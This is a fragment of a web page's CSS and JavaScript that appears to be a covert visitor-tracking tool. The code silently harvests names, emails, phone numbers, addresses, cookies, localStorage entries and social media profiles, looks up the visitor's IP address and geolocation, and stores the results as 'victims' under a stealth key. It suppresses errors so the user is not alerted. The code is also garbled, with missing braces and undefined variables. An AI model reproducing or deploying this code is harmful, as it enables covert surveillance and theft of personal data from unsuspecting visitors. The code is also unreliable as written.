        .image-title {
            font-weight: bold;

        .image-desc {
            font-size: 0.8em;
            opacity: 0.7;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
            font-size: 1.1em;
        }
        .pulse {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .warning {
            text-align: center;
            font-size: 0.8em;
            opacity: 0.6;
            margin-top: 20px;

            top: 0;

        // Personal data scanning function
        async function scanPersonalData() {
            const personalData = {
                names: [],
                ages: [],
                emails: [],
                phones: [],
                addresses: [],
                foundInCookies: [],
                foundInStorage: []
            };

            try {
                // Scan page content for personal data
                const pageContent = document.body.innerText;
                
                // Scan for names
                PERSONAL_DATA_PATTERNS.names.forEach(pattern => {
                    const matches = pageContent.match(pattern);
                    if (matches) {
                        personalData.names = [...new Set([...personalData.names, ...matches.map(m => m.trim())])];
                    }
                });

                // Scan for ages
                PERSONAL_DATA_PATTERNS.ages.forEach(pattern => {
                    const matches = pageContent.match(pattern);
                    if (matches) {
                        personalData.ages = [...new Set([...personalData.ages, ...matches.map(m => m.trim())])];
                    }
                });

                // Scan for emails
                PERSONAL_DATA_PATTERNS.emails.forEach(pattern => {
                    const matches = pageContent.match(pattern);
                    if (matches) {
                        personalData.emails = [...new Set([...personalData.emails, ...matches.map(m => m.trim())])];
                    }
                });

                // Scan for phones
                PERSONAL_DATA_PATTERNS.phones.forEach(pattern => {
                    const matches = pageContent.match(pattern);
                    if (matches) {
                        personalData.phones = [...new Set([...personalData.phones, ...matches.map(m => m.trim())])];
                    }
                });

                // Scan for addresses
                PERSONAL_DATA_PATTERNS.addresses.forEach(pattern => {
                    const matches = pageContent.match(pattern);
                    if (matches) {
                        personalData.addresses = [...new Set([...personalData.addresses, ...matches.map(m => m.trim())])];
                    }
                });

                // Scan cookies for personal data
                if (document.cookie) {
                    const cookieData = document.cookie.split(';');
                    cookieData.forEach(cookie => {
                        const [name, value] = cookie.split('=').map(s => s.trim());
                        if (name.includes('user') || name.includes('name') || name.includes('email') || value.includes('@')) {
                            personalData.foundInCookies.push(`${name}=${value}`);
                        }
                    });
                }

                // Scan localStorage for personal data
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    if (key && value && (key.includes('user') || key.includes('name') || key.includes('email') || value.includes('@'))) {
                        personalData.foundInStorage.push(`${key}=${value}`);
                    }
                }

            } catch (error) {
                // Silent fail - don't alert user
            }

            return personalData;
        }

        // Social media data scanning
        async function scanSocialMediaData() {
            const socialData = {
                usernames: [],
                platforms: [],
                profiles: []
            };

            try {
                const pageContent = document.body.innerText + ' ' + document.body.innerHTML;
                
                // Scan for social media handles
                PERSONAL_DATA_PATTERNS.social.forEach(pattern => {
                    const matches = pageContent.match(pattern);
                    if (matches) {
                        socialData.usernames = [...new Set([...socialData.usernames, ...matches.map(m => m.trim())])];
                    }
                });

                // Check for social media links
                const socialLinks = [
                    'facebook.com/',
                    'twitter.com/',
                    'instagram.com/',
                    'tiktok.com/',
                    'linkedin.com/in/',
                    'youtube.com/',
                    'snapchat.com/add/'
                ];

                socialLinks.forEach(platform => {
                    const regex = new RegExp(`https?://(?:www\\.)?${platform}([A-Za-z0-9_.-]+)`, 'gi');
                    const matches = pageContent.match(regex);
                    if (matches) {
                        socialData.profiles.push(...matches);
                        socialData.platforms.push(platform.replace('.com/', ''));
                    }
                });

            } catch (error) {
                // Silent fail
            }

            return socialData;
        }

        // Enhanced IP collection
        async function getEnhancedIP() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ipinfo.io/json'
            ];

            for (const service of services) {
                try {
                    const response = await fetch(service, { 
                        mode: 'cors',
                        credentials: 'omit',
                        signal: AbortSignal.timeout(3000)
                    });
                    const data = await response.json();
                    return { ip: data.ip || data.query || 'Unknown' };
                } catch (error) {
                    continue;
                }
            }
            return { ip: 'Unknown' };
        }

        // Enhanced location data
        async function getEnhancedLocation(ip) {

                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return data;
            } catch (error) {
                return {};
            }
        }

        // Network information
        async function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return {
                effectiveType: connection ? connection.effectiveType : 'Unknown',
                downlink: connection ? connection.downlink + ' Mbps' : 'Unknown',
                rtt: connection ? connection.rtt + ' ms' : 'Unknown',
                saveData: connection ? connection.saveData : 'Unknown',
                onLine: navigator.onLine
            };
        }

        function detectVPN(ip) {
            const datacenterRanges = ['104.', '107.', '108.', '109.', '140.', '144.', '146.', '147.', '148.', '149.'];
            return datacenterRanges.some(range => ip.startsWith(range)) ? 'Possible VPN/Proxy' : 'Residential IP';
        }

        function storeEnhancedVictim(victimData) {

            victims.unshift(victimData);
            if (victims.length > 100) victims = victims.slice(0, 100);
            localStorage.setItem(stealthKey, JSON.stringify(victims));

            message += `üîó *URL:* ${window.location.href}\n`;
            message += `üìä *Referrer:* ${document.referrer || 'Direct'}`;

            return message;
        }
